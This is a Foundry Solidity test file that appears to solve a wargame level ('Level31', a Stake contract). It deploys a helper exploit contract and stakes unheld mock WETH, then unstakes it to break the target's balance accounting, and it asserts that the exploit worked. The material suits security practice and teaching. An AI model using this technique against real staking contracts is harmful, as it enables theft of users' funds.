// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VmSafe} from "forge-std/Vm.sol";
import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "forge-std/mocks/MockERC20.sol";
import {Stake} from "../src/Level31.sol";
import {StakeExploit} from "../src/Level31Exploit.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract Level31Test is Test {
    Stake public target;
    VmSafe.Wallet attacker;

    function setUp() public {
        attacker = vm.createWallet("attacker");
        VmSafe.Wallet memory deployer = vm.createWallet("deployer");
        vm.deal(attacker.addr, 1 ether);

        vm.startPrank(deployer.addr, deployer.addr);
        WETH weth = new WETH(1 ether);
        target = new Stake(address(weth));
        vm.stopPrank();
    }

    function test_exploit() public {
        vm.startPrank(attacker.addr, attacker.addr);
        exploit(address(target));
        vm.stopPrank();

        assertGt(address(target).balance, 0);
        assertGt(target.totalStaked(), address(target).balance);
        assertTrue(target.Stakers(attacker.addr));
        assertEq(target.UserStake(attacker.addr), 0);
    }

    function exploit(address _target) private {
        StakeExploit e = new StakeExploit();
        e.exploit{value: 0.001 ether + 2 wei}(payable(_target));

        IERC20(Stake(_target).WETH()).approve(_target, type(uint256).max);
        Stake(_target).StakeWETH(0.001 ether + 1 wei);
        Stake(_target).Unstake(0.001 ether + 1 wei);
    }
}

contract WETH is MockERC20 {
    constructor(uint256 amount) {
        initialize("WETH", "WETH", 18);
        _mint(msg.sender, amount);
    }
}
